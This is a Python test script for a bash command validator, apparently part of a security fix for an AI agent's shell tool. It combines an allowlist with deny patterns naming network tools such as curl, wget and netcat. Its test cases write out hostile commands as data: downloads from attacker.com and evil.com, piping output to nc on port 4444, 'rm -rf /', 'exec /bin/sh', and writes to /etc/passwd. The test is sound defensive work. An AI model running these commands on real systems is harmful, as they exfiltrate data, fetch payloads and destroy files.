#!/usr/bin/env python3
"""
Standalone test for the command validation logic without MetaGPT dependencies.
"""
import re

class BashValidator:
    """Isolated validation logic from the security fix"""
    
    def __init__(self):
        # Define allowed commands and dangerous patterns for security
        self.safe_commands = {
            # File operations
            'ls', 'dir', 'pwd', 'cd', 'cat', 'head', 'tail', 'wc', 'find', 'grep', 'awk', 'sed',
            # Custom shell functions defined in the environment
            'open', 'goto', 'scroll_down', 'scroll_up', 'create', 'search_dir_and_preview',
            'search_file', 'find_file', 'edit', 'submit',
            # Safe development tools
            'git', 'python3', 'python', 'pip', 'node', 'npm', 'yarn', 'make', 'cmake',
            # Text processing
            'echo', 'printf', 'sort', 'uniq', 'cut', 'tr', 'paste', 'join'
        }
        
        self.dangerous_patterns = [
            # Network operations that could exfiltrate data or download malicious content
            r'\b(curl|wget|nc|netcat|telnet|ssh|scp|rsync|ftp|sftp)\b',
            # Destructive file operations
            r'\b(rm\s+-rf|rmdir|shred|dd)\b',
            # System modification
            r'\b(chmod\s+777|chown|su|sudo|passwd|useradd|usermod|userdel)\b',
            # Process control
            r'\b(kill|killall|pkill|nohup|crontab|at|batch)\b',
            # Shell metacharacters that could be used for command injection
            r'[;&|`$()]',
            # Redirection that could overwrite important files
            r'>.*/(etc|usr|bin|sbin|boot|sys|proc)',
            # Execution of arbitrary files
            r'\b(exec|eval|source|\.)\s',
        ]

    def _validate_command(self, cmd: str) -> tuple[bool, str]:
        """
        Validates if a command is safe to execute.
        
        Args:
            cmd (str): The command to validate
            
        Returns:
            tuple[bool, str]: (is_safe, reason_if_unsafe)
        """
        if not cmd or not cmd.strip():
            return False, "Empty command not allowed"
            
        cmd_clean = cmd.strip().lower()
        
        # Check for dangerous patterns
        for pattern in self.dangerous_patterns:
            if re.search(pattern, cmd, re.IGNORECASE):
                return False, f"Command contains dangerous pattern: {pattern}"
        
        # Extract the base command (first word)
        base_cmd = cmd_clean.split()[0]
        
        # Allow custom shell functions and safe commands
        if base_cmd in self.safe_commands:
            return True, ""
            
        # Special case for common safe variations
        if base_cmd.startswith('python') and re.match(r'^python\d*(\.\d+)?$', base_cmd):
            return True, ""
            
        return False, f"Command '{base_cmd}' is not in the allowlist of safe commands"


def test_validation_logic():
    """Test the command validation logic"""
    validator = BashValidator()
    
    print("🔒 Testing Command Validation Logic")
    print("=" * 50)
    
    # Test cases: (command, should_be_blocked, description)
    test_cases = [
        # Safe commands (should work)
        ("ls -la", False, "Safe file listing"),
        ("pwd", False, "Safe current directory"),
        ("echo 'hello world'", False, "Safe echo command"),
        ("python3 --version", False, "Safe python command"),
        ("git status", False, "Safe git command"),
        ("open file.py", False, "Safe custom shell function"),
        ("edit 1:5", False, "Safe custom edit function"),
        
        # Dangerous commands (should be blocked)
        ("curl http://attacker.com/shell.sh", True, "Network download"),
        ("wget http://evil.com/malware", True, "Malicious download"),
        ("rm -rf /", True, "Destructive file removal"),
        ("sudo passwd root", True, "System modification"),
        ("ls; curl attacker.com", True, "Command chaining with semicolon"),
        ("ls | nc attacker.com 4444", True, "Command piping"),
        ("$(curl attacker.com)", True, "Command substitution with $()"),
        ("ls `wget evil.com`", True, "Command substitution with backticks"),
        ("echo 'test' > /etc/passwd", True, "Dangerous redirection"),
        ("exec /bin/sh", True, "Arbitrary execution"),
        ("eval 'malicious code'", True, "Eval injection"),
        ("chmod 777 /etc/shadow", True, "Dangerous permissions change"),
        ("netcat attacker.com 4444", True, "Network connection tool"),
        ("unknown_command", True, "Command not in allowlist"),
        ("", True, "Empty command"),
    ]
    
    passed_tests = 0
    failed_tests = 0
    
    for cmd, should_be_blocked, description in test_cases:
        print(f"\n📋 Testing: {description}")
        print(f"   Command: '{cmd}'")
        
        is_safe, reason = validator._validate_command(cmd)
        is_blocked = not is_safe
        
        if should_be_blocked and is_blocked:
            print(f"   ✅ PASS - Command correctly blocked: {reason}")
            passed_tests += 1
        elif not should_be_blocked and not is_blocked:
            print(f"   ✅ PASS - Safe command allowed")
            passed_tests += 1
        elif should_be_blocked and not is_blocked:
            print(f"   ❌ FAIL - Dangerous command was NOT blocked!")
            failed_tests += 1
        else:  # not should_be_blocked and is_blocked
            print(f"   ❌ FAIL - Safe command was incorrectly blocked: {reason}")
            failed_tests += 1
    
    print(f"\n" + "=" * 50)
    print(f"🔒 Validation Test Results:")
    print(f"   ✅ Passed: {passed_tests}")
    print(f"   ❌ Failed: {failed_tests}")
    print(f"   Total: {passed_tests + failed_tests}")
    
    if failed_tests == 0:
        print(f"   🎉 ALL TESTS PASSED - Validation logic is working!")
        return True
    else:
        print(f"   ⚠️  SOME TESTS FAILED - Validation logic needs improvement")
        return False


if __name__ == "__main__":
    success = test_validation_logic()
    exit(0 if success else 1)